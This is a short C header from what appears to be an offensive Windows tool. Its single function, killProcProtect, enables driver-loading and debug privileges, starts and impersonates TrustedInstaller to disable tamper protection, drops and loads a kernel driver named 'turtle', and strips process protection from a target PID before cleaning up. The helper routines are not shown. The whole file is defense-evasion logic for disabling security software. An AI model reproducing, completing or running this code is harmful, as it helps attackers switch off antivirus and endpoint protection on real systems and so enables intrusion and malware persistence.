#pragma once
#include "common.h"

BOOL killProcProtect(int killPid) {
	if (!WindowsEnablePrivilege(SE_LOAD_DRIVER_NAME))
		return Error("Failed to set se load driver priv");
	if (!WindowsCheckPrivilege(SE_LOAD_DRIVER_NAME))
		return Error("Failed to set se load driver priv");
	// Enable SE DEBUG TO GET HANDLES TO PROCS
	if (!WindowsEnablePrivilege(SE_DEBUG_NAME))
		return Error("Failed to set se debug priv");
	if (!WindowsCheckPrivilege(SE_DEBUG_NAME))
		return Error("Failed to set se debug priv");
	// start trusted installer
	if (!StartTrustedInstallerService())
		return Error("Failed to start trusted installer");
	// get trusted installer pid
	int trustedInstallerPid = GetProcRunningAsTrustedInstaller();
	if (trustedInstallerPid == 0)
		return Error("Failed to enum processes OR trusted installer not found!");
	// elevate to trusted installer and disable tamper protection
	if (!DisableTamperProtection(trustedInstallerPid))
		return Error("failed to disable tamper protection");
	// Drop Driver To Disk
	if (!DropTurtleDriver())
		return Error("failed to drop turtle driver to disk");
	// create driver service and load driver
	if (!LoadTurtleDriver())
		return Error("failed to load turtle driver");
	if (!DisableProcProtection(killPid))
		return Error("Failed to disable process protection");
	printf("::: Successfully Disabled Protection On %d :::\n", killPid);
	Sleep(5000);
	if (!CleanUp(trustedInstallerPid))
		return Error("Failed to cleanup");
	return TRUE;
}